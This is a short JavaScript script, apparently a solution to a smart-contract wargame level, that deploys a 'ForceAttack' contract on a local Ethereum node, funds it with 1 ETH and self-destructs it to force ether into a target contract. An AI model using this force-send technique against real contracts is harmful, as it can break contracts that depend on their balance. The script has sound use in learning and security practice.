const { ethers } =  require("ethers"); 
const fs = require('fs');

const url = "http://localhost:8545";

const provider = new ethers.providers.JsonRpcProvider(url);

// Getting the accounts
const signer = provider.getSigner(19);

contract_address = "0xe082b26cEf079a095147F35c9647eC97c2401B83"

const metadata = JSON.parse(fs.readFileSync('../artifacts/contracts/ForceAttack.sol/ForceAttack.json').toString())

forceFactory = new ethers.ContractFactory(metadata.abi, metadata.bytecode, signer)


;(async () => {
    price = ethers.utils.formatUnits(await provider.getGasPrice(), 'gwei')
    deployOptions = {gasLimit: 1000000, gasPrice: ethers.utils.parseUnits(price, 'gwei')}

    forceContract = await forceFactory.deploy(contract_address, deployOptions)
    await forceContract.deployTransaction.wait()
    
    sendEthOptions = {value:ethers.utils.parseEther("1.0")}

    tx = await forceContract.loadEther(sendEthOptions)
    await tx.wait()

    tx = await forceContract.kill()
    await tx.wait()
    console.log(tx)
})();